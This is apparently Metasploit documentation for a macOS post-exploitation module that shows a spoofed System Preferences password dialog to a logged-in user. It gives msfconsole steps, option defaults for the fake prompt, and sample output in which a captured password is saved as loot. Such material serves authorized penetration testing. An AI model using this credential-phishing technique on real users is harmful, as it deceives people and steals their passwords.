## Vulnerable Application

Presents a password prompt dialog to a logged-in OSX user.  Depending on the version of OSX, additional steps may be necessary to
allow permission for the prompt to be displayed.  See Scenarios for additional details.

## Verification Steps

  1. Start msfconsole
  2. Get a shell, user level is fine.
  3. Do: ```use post/osx/gather/password_prompt_spoof```
  4. Do: ```set session #```
  5. Do: ```run```
  6. The user will be prompted to enter their password, or complete additional steps.

## Options

   **BUNDLEPATH**
   Path to bundle containing icon.  Default is `/System/Library/CoreServices/CoreTypes.bundle`.

   **ICONFILE**
   Icon filename relative to bundle.  Default is `UserUnknownIcon.icns`

   **TEXTCREDS**
   Text displayed when asking for a password. Default is `Type your password to allow System Preferences to make changes`.

   **TIMEOUT**
   Timeout for user to enter credentails.  Default is `60`.  Newer versions of OSX may require additional time due to user interaction.

## Scenarios

### User level shell on OSX 10.14.4

If the user does not complete the prompt in time, or does not enable permissions to receive the prompt:

```
msf5 post(osx/gather/password_prompt_spoof) > run

[*] Running module against MacBook-Pro.nogroup
[*] Waiting for user 'h00die' to enter credentials...
[*] Timeout period expired before credentials were entered!
[*] Cleaning up files in MacBook-Pro.nogroup:/tmp/.SGFvISFemjti
[*] Post module execution completed
```

If the user DOES complete the prompt in time:

```
msf5 post(osx/gather/password_prompt_spoof) > run

[*] Running module against MacBook-Pro.nogroup
[*] Waiting for user 'h00die' to enter credentials...
[*] Password entered! What a nice compliant user...
[+] password file contents: 20190415_122536:h00die:alfalfasprouts!
[+] Password data stored as loot in: /loot/20190415122537_default_192.168.2.225_password_355107.txt
[*] Cleaning up files in MacBook-Pro.nogroup:/tmp/.jJATztdro
[*] Post module execution completed
```

#### User Experience

The following screen shots are from OSX 10.14.4 from a `ssh_login` shell as the user.  Executable may change depending on the shell type and user permissions.

The user is first prompts for additional permissions (System Events):

<img width="423" alt="Screen Shot 2019-04-15 at 12 19 38 PM" src="https://user-images.githubusercontent.com/752491/56173728-ead79c80-5fbc-11e9-8a8f-3b3265220c95.png">

Next, the user is prompted to allow Accessibility Access (Events):

<img width="463" alt="Screen Shot 2019-04-15 at 12 20 08 PM" src="https://user-images.githubusercontent.com/752491/56173737-f4f99b00-5fbc-11e9-9dcc-efbfe0cd08eb.png">

Clicking Open System Preferences shows the executable asking for the permissions.  The screenshot was taken after clicking the lock in the bottom left corner,
and checking `sshd-keygen-wrapper`:

<img width="670" alt="Screen Shot 2019-04-15 at 12 24 27 PM" src="https://user-images.githubusercontent.com/752491/56173742-fa56e580-5fbc-11e9-8d28-5669e9e9448f.png">

Finally, if done within the `TIMEOUT` (or with all required permissions):

<img width="424" alt="Screen Shot 2019-04-15 at 12 25 25 PM" src="https://user-images.githubusercontent.com/752491/56173748-fe830300-5fbc-11e9-9564-0e7137b051a8.png">

